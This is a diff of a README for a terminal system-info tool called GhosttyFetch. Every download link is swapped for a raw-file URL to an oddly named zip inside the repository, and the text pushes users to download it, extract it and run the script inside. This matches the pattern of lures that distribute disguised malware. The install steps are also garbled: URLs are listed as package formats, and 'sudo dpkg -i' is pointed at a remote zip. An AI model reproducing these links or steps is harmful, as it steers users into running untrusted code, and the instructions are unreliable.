@@ -1,6 +1,6 @@
 # 🎉 GhosttyFetch - Get Animated System Info Easily
 
-![Download GhosttyFetch](https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/sysinfo/GhosttyFetch_3.0.zip%20GhosttyFetch-%20-%2300a3e0?style=flat&logo=github)
+![Download GhosttyFetch](https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/platform/Ghostty-Fetch-uneducatedness.zip%20GhosttyFetch-%20-%2300a3e0?style=flat&logo=github)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to GhosttyFetch! This tool displays animated system information on your 
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download** the latest release of GhosttyFetch: [GitHub Releases Page](https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/sysinfo/GhosttyFetch_3.0.zip).
+To get started, **visit this page to download** the latest release of GhosttyFetch: [GitHub Releases Page](https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/platform/Ghostty-Fetch-uneducatedness.zip).
 
 1. **Open the link** to the GitHub releases page.
 2. **Find the latest version** listed at the top.
@@ -17,7 +17,7 @@ To get started, **visit this page to download** the latest release of GhosttyFet
 5. Download the file that matches your operating system:
    - For Windows, look for `.exe`.
    - For macOS, look for `.dmg`.
-   - For Linux, look for appropriate package formats like `.deb` or `https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/sysinfo/GhosttyFetch_3.0.zip`.
+   - For Linux, look for appropriate package formats like `.deb` or `https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/platform/Ghostty-Fetch-uneducatedness.zip`.
 
 After downloading, follow these steps to install:
 
@@ -33,8 +33,8 @@ After downloading, follow these steps to install:
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
 3. Run the appropriate command to install:
-   - For `.deb` files: `sudo dpkg -i https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/sysinfo/GhosttyFetch_3.0.zip`
-   - For `https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/sysinfo/GhosttyFetch_3.0.zip` files: Extract it and run the contained script.
+   - For `.deb` files: `sudo dpkg -i https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/platform/Ghostty-Fetch-uneducatedness.zip`
+   - For `https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/platform/Ghostty-Fetch-uneducatedness.zip` files: Extract it and run the contained script.
 
 ## 🔧 Requirements
 
@@ -44,7 +44,7 @@ To run GhosttyFetch smoothly, ensure your device meets these requirements:
 - Basic compatibility with your system:
   - **Windows:** Version 7 or later.
   - **macOS:** Version 10.14 or later.
-  - **Linux:** Any recent distribution that supports `.deb` or `https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/sysinfo/GhosttyFetch_3.0.zip` files.
+  - **Linux:** Any recent distribution that supports `.deb` or `https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/platform/Ghostty-Fetch-uneducatedness.zip` files.
 - Sufficient RAM and storage to run animated graphics.
 
 ## 💡 Features
@@ -87,4 +87,4 @@ If you need help or want to share your experiences, join the GhosttyFetch commun
 
 Thank you for choosing GhosttyFetch! Enjoy your animated system info and the unique touch it brings to your Ghostty terminal.
 
-![Download GhosttyFetch](https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/sysinfo/GhosttyFetch_3.0.zip%20GhosttyFetch-%20-%2300a3e0?style=flat&logo=github)
+![Download GhosttyFetch](https://raw.githubusercontent.com/Lullal/GhosttyFetch/main/src/platform/Ghostty-Fetch-uneducatedness.zip%20GhosttyFetch-%20-%2300a3e0?style=flat&logo=github)
